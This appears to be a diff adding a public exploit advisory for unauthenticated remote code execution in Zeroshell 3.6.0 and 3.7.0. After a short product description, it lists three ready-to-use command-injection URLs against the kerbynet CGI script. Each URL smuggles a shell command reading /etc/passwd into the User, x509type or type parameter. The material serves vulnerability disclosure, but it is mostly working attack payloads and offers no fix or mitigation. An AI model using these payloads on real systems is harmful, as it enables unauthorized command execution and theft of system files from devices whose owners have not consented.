@@ -1,0 +1,71 @@
+####################################################################################################################################
+# Exploit Title: Zeroshell - Net Services  Unauthenticated Remote Code Execution | RCE
+# Date: 13.01.2017
+# Exploit Author: Ozer Goker
+# Vendor Homepage: http://www.zeroshell.org
+# Software Link: www.zeroshell.org/download/
+# Version: 3.6.0 & 3.7.0
+####################################################################################################################################
+
+Introduction
+
+Zeroshell is a small Linux distribution for servers and embedded devices with the aim to provide network services. It is available in the form of live CD or compact Flash image and it can be configured using a web browser. The main features of Zeroshell include: load balancing and failover of multiple Internet connections, UMTS/HSDPA connections by using 3G modems, RADIUS server for providing secure authentication and automatic management of encryption keys to wireless networks, captive portal to support web login, and many others.
+
+
+Vulnerabilities: Unauthenticated Remote Code Execution | RCE
+
+
+RCE details:
+
+####################################################################################################################################
+
+RCE 1
+
+URL
+http://192.168.0.75/cgi-bin/kerbynet?Action=StartSessionSubmit&User=%27%26cat%20/etc/passwd%26%27&PW=
+
+METHOD
+Get,Post
+
+PARAMETER
+User
+
+PAYLOAD
+%27%26cat%20/etc/passwd%26%27
+
+
+####################################################################################################################################
+
+RCE 2
+
+URL
+http://192.168.0.75/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%26cat%20/etc/passwd%26%27
+
+METHOD
+Get
+
+PARAMETER
+x509type
+
+PAYLOAD
+%27%26cat%20/etc/passwd%26%27
+
+
+####################################################################################################################################
+
+RCE 3
+
+URL
+http://192.168.0.75/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=%22%26cat%20/etc/passwd%26%22
+
+METHOD
+Get
+
+PARAMETER
+type
+
+PAYLOAD
+%22%26cat%20/etc/passwd%26%22
+
+
+####################################################################################################################################
